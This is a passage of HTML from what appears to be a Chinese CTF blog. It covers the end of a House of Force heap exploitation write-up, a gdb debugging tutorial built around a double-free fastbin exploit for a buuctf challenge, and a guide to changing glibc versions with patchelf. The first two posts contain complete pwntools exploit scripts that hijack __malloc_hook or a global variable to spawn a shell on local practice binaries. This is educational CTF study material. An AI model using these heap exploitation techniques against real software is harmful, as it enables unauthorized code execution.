-<h4 id="修改topchunk-size"><a href="#修改topchunk-size" class="headerlink" title="修改topchunk  size:"></a>修改<code>topchunk</code>  size:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125636159.png" alt="image-20251127125636159"></p>
-<h4 id="计算偏移移动top-chunk到新位置"><a href="#计算偏移移动top-chunk到新位置" class="headerlink" title="计算偏移移动top chunk到新位置:"></a>计算偏移移动<code>top chunk</code>到新位置:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">// <span class="number">0x20</span>的偏移通过调试获得</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125941799.png" alt="image-20251127125941799"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127125952099.png" alt="image-20251127125952099"></p>
-<p>这里可以看到new top 被移动到了malloc_hook - 0x10的位置。</p>
-<p>这样我们就可以进行任意地址写 覆写malloc_hook的地址了</p>
-<h4 id="写入system："><a href="#写入system：" class="headerlink" title="写入system："></a>写入system：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里可以看到<code>new topchunk</code> 切割了一块0x20大小的堆块给返回给用户</p>
-<p>我们从这里写入了system的地址</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251127130158802.png" alt="image-20251127130158802"></p>
-<p>后面再次利用malloc函数就可以实现打通。</p>
-<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io= process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;now what to write?\n&quot;</span>,content)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x888888</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"><span class="comment">#add(1, 0x888888, &#x27;aaa&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">libcc = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc.address= libcc +<span class="number">0x888ff0</span></span><br><span class="line">log.success(<span class="string">&quot;libc :&quot;</span> + <span class="built_in">hex</span>(libcc))</span><br><span class="line">log.success(<span class="string">&quot;libc.address :&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">gdb.attach(io)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">top=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+<span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;top :&quot;</span>+<span class="built_in">hex</span>(top))</span><br><span class="line"></span><br><span class="line">malloc_hook=libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;malloc_hook :&#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;system :&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">offset = (malloc_hook-<span class="number">0x20</span>)-top</span><br><span class="line">log.success(<span class="string">&quot;offset :&quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,offset,<span class="string">&#x27;xxxx&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr=<span class="built_in">int</span>(io.recv(<span class="number">10</span>),<span class="number">16</span>)+offset</span><br><span class="line">log.success(<span class="string">&quot;addr :&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x10</span>,p64(system))</span><br><span class="line">io.recvuntil(<span class="string">&quot;on &quot;</span>)</span><br><span class="line">addr1=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;addr1 :&quot;</span>+<span class="built_in">hex</span>(addr1))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;4.go away\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;which index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;how much space do u want?\n&quot;</span>, <span class="built_in">str</span>(top))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>house of force 的关键在于可以修改<code>topchunk</code>的size部分 以及 计算好到target目标地址的偏移量。</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem('bin%20sh'))/index.html">https://tamoly.github.io/2025/07/13/NSSCTF-PWN%E9%A2%98%E8%A7%A3/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20%E5%86%B3%E8%B5%9B%20easy_force(House%20of%20Force%E5%92%8Csystem(&#39;bin%20sh&#39;))/index.html</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/11/12/gdb/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/11/12/gdb/" class="post-title-link" itemprop="url">gdb新的理解</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-11-12 17:30:00" itemprop="dateCreated datePublished" datetime="2025-11-12T17:30:00+08:00">2025-11-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-12-05 01:16:35" itemprop="dateModified" datetime="2025-12-05T01:16:35+08:00">2025-12-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.2k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="gdb新的理解"><a href="#gdb新的理解" class="headerlink" title="gdb新的理解"></a>gdb新的理解</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>其实感觉之前一直有gdb调试恐惧症。</p>
-<p>但是通过最近的练习和复现，对gdb有了一些新的理解与感悟。</p>
-<p>之前常常因为搞不清楚调试的位置，不知道怎么查看想看的程序执行情况而苦恼。</p>
-<p>通过最近的联系理解了断点的重要性，以及一些新的gdb指令。</p>
-<p>希望可以一直进步下去！！！</p>
-<p>新学会了用python交互模式进行gdb的单步调试</p>
-<p>下面以一个简单的uaf堆题为例：</p>
-<h2 id="题目（buuctf-easyfast）"><a href="#题目（buuctf-easyfast）" class="headerlink" title="题目（buuctf easyfast）:"></a>题目（buuctf easyfast）:</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb1.png" alt="gdb1"></p>
-<h3 id="creat"><a href="#creat" class="headerlink" title="creat:"></a>creat:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145102620.png" alt="image-20251112145102620"></p>
-<h3 id="shell"><a href="#shell" class="headerlink" title="shell:"></a>shell:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/gdb2.png" alt="gdb2"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145421701.png" alt="image-20251112145421701"></p>
-<p>这里可以看到data段的全局变量<strong>602090</strong>初始的时候是<strong>1</strong></p>
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145252356.png" alt="image-20251112145252356"></p>
-<p>这里存在一个 **uaf **漏洞。</p>
-<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112145305907.png" alt="image-20251112145305907"></p>
-<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><p>这里的思路就是利<u>doublefree</u>或者 <u>uaf</u> 将 全局变量<strong>602090</strong>变为0</p>
-<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 环境配置</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./easyfast&#x27;</span>)  <span class="comment"># 本地调试</span></span><br><span class="line"><span class="comment"># p = remote(&#x27;target.ip&#x27;, port)  # 远程连接</span></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602090</span>  <span class="comment"># 目标地址（如 GOT 表）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 堆操作函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;申请堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size&gt;&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;释放堆块&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index, content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;填充堆块内容&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index&gt;&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;触发漏洞函数&quot;&quot;&quot;</span></span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;choice&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] Exploit 流程</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 申请两个 0x50 大小的堆块（0x40 + header）</span></span><br><span class="line">alloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 构造 Double Free</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 释放 chunk 0</span></span><br><span class="line">free(<span class="number">1</span>)      <span class="comment"># 释放 chunk 1</span></span><br><span class="line">free(<span class="number">0</span>)      <span class="comment"># 再次释放 chunk 0，形成 fastbin 链表：0 -&gt; 1 -&gt; 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 控制 fastbin 链表头</span></span><br><span class="line">payload = p64(target - <span class="number">0x10</span>)  <span class="comment"># 指向目标地址 - 0x10（chunk header）</span></span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 重新分配，控制目标地址附近的内存</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 0 位置</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到原 chunk 1 位置，此时其 fd 指向 target-0x10</span></span><br><span class="line">alloc(<span class="number">0x40</span>)  <span class="comment"># 分配到 target-0x10 附近，可以覆盖目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 覆盖目标内容（如 GOT 表项）</span></span><br><span class="line">payload = p64(<span class="number">0</span>)  <span class="comment"># 或者 system(&quot;/bin/sh&quot;) 的地址</span></span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 触发漏洞</span></span><br><span class="line">shell()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="动态调试part1："><a href="#动态调试part1：" class="headerlink" title="动态调试part1："></a><strong>动态调试part1</strong>：</h2><ul>
-<li>首先开启一个<strong>python3</strong> 解释器:</li>
-</ul>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112150609622.png" alt="image-20251112150609622"></p>
-<p>这里同时也可以看到我们启动了一个进程72687</p>
-<ul>
-<li>同时开启另一个<strong>gdb</strong>终端：</li>
-</ul>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112151018331.png" alt="image-20251112151018331"></p>
-<p><code>attach (pid)</code>在gdb里面附件进程。</p>
-<ul>
-<li>设置关键断点：</li>
-</ul>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932098054.png" alt="QQ_1762932098054"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932109240.png" alt="QQ_1762932109240"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932126635.png" alt="QQ_1762932126635"></p>
-<p>在三个关键函数的返回处设置断点</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932409290.png" alt="QQ_1762932409290"></p>
-<p>然后continue等待解释器输入</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932489263.png" alt="QQ_1762932489263"></p>
-<ul>
-<li>开始进行单步调试：</li>
-</ul>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932787984.png" alt="QQ_1762932787984"></p>
-<p>这里定义函数</p>
-<p>然后下面我们执行了<code>alloc(0x40)</code>创建了0x40大小的堆块</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/QQ_1762932811796.png" alt="QQ_1762932811796"></p>
-<p>这里可以看到右边的终端停在了我们设置的断点</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153558163.png" alt="image-20251112153558163"></p>
-<p>这里也可以看到我们的堆块创建成功。</p>
-<p>这样调试可以看到每步的执行情况。</p>
-<p>每次进入<code>Continuing.</code>等待执行时候在python解释器执行新的指令</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112153909048.png" alt="image-20251112153909048"></p>
-<p>这里看到成功把<code>chunk0</code>的<code>fd</code>改为<code>全局变量-0x10</code>,然后后面通过edit就可以修改这个伪造的堆块，也就是我们需要利用全局变量</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112154622804.png" alt="image-20251112154622804"></p>
-<p>查看全局变量<code>buf</code></p>
-<p>可以看到我们的目标地址被当作了一个堆块。后面就修改堆块3即可。</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155101849.png" alt="image-20251112155101849"></p>
-<p>这里可以看到我们成功启动了shell的进程：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155456001.png" alt="image-20251112155456001"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112155433697.png" alt="image-20251112155433697"></p>
-<p><strong>注意</strong>：</p>
-<p><code>ctrl + d </code>退出python解释器</p>
-<p>想看执行情况可以随时<code>ctrl + c</code>暂停gdb终端</p>
-<h2 id="动态调试part2："><a href="#动态调试part2：" class="headerlink" title="动态调试part2："></a><strong>动态调试part2</strong>：</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162347772.png" alt="image-20251112162347772"></p>
-<p>这里可以看到我们进入了<code>interactive mode</code></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162428445.png" alt="image-20251112162428445"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162453383.png" alt="image-20251112162453383"></p>
-<p>继续4执行<code>shell()</code>成功</p>
-<p>同时可以利用<code>interactive mode</code>和<code>gdb.attach()</code></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162721541.png" alt="image-20251112162721541"></p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251112162730716.png" alt="image-20251112162730716"></p>
-<p>这里就是说当写脚本的时候可以利用<code>interactive mode</code> 继续往下执行<code>gdb.attach</code>后面的内容。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/09/25/%E6%9B%B4%E6%8D%A2glibc/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/tou.jpg">
-      <meta itemprop="name" content="JC">
-      <meta itemprop="description" content="ʕ´•ᴥ• ʔ">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="mvegetable'blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2025/09/25/%E6%9B%B4%E6%8D%A2glibc/" class="post-title-link" itemprop="url">glibc 版本</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2025-09-25 22:39:44" itemprop="dateCreated datePublished" datetime="2025-09-25T22:39:44+08:00">2025-09-25</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-12-05 01:16:42" itemprop="dateModified" datetime="2025-12-05T01:16:42+08:00">2025-12-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.6k</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="更换glibc版本"><a href="#更换glibc版本" class="headerlink" title="更换glibc版本"></a>更换glibc版本</h1><h2 id="1-下载glibc-all-in-one"><a href="#1-下载glibc-all-in-one" class="headerlink" title="1.下载glibc_all_in_one"></a>1.下载glibc_all_in_one</h2><p>步骤 1：安装依赖工具 </p>
-<p>bash: sudo apt install patchelf git </p>
-<p>步骤 2：下载 glibc-all-in-one </p>
-<p>bash: git clone <a target="_blank" rel="noopener" href="https://github.com/matrix1001/glibc-all-in-one.git">https://github.com/matrix1001/glibc-all-in-one.git</a> </p>
-<p>cd glibc-all-in-one</p>
-<h2 id="2-下载对应版本的glibc-2-23为例"><a href="#2-下载对应版本的glibc-2-23为例" class="headerlink" title="2.下载对应版本的glibc(2.23为例)"></a>2.下载对应版本的glibc(2.23为例)</h2><p>.&#x2F;update_list</p>
-<p>cat list | grep 2.23</p>
-<p>.&#x2F;download 2.23-0ubuntu3_amd64</p>
-<p><strong>问题</strong>：</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165210090.png" alt="image-20250725165210090"></p>
-<p>出现<code>sudo: unable to execute ./update_list: No such file or directory</code>错误，看似矛盾（<code>ls</code>明明显示文件存在），实际是因为<code>update_list</code>脚本的<strong>解释器路径无效</strong>或脚本本身存在损坏。具体解决步骤如下：</p>
-<p>1.检查<code>update_list</code>脚本的头部解释器</p>
-<p># 查看脚本首行 head -n 1 .&#x2F;update_list</p>
-<p>正常输出应为：</p>
-<p>#!&#x2F;bin&#x2F;bash</p>
-<h2 id="3-更换"><a href="#3-更换" class="headerlink" title="3.更换"></a>3.更换</h2><p>❯ patchelf –set-interpreter &#x2F;home&#x2F;jc&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.23-0ubuntu3_i386&#x2F;ld-2.23.so <br>         –set-rpath &#x2F;home&#x2F;jc&#x2F;glibc-all-in-one&#x2F;&#x2F;libs&#x2F;2.23-0ubuntu3_i386&#x2F; <br>         .&#x2F;pwn160</p>
-<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165549637.png" alt="image-20250725165549637"></p>
-<p>注意路径！！！</p>
-<h2 id="4-检查"><a href="#4-检查" class="headerlink" title="4.检查"></a>4.检查</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725165853663.png" alt="image-20250725165853663"></p>
-<h2 id="5-换回去"><a href="#5-换回去" class="headerlink" title="5.换回去"></a>5.换回去</h2><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20250725170102584.png" alt="image-20250725170102584"></p>
-<p>1.patchelf –remove-rpath .&#x2F;hacknote  </p>
-<p>清除之前通过<code>--set-rpath</code>指定的 glibc 库路径</p>
-<p>2.patchelf –set-interpreter &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-linux.so.2 .&#x2F;hacknote</p>
-<p>恢复系统默认的动态链接器</p>
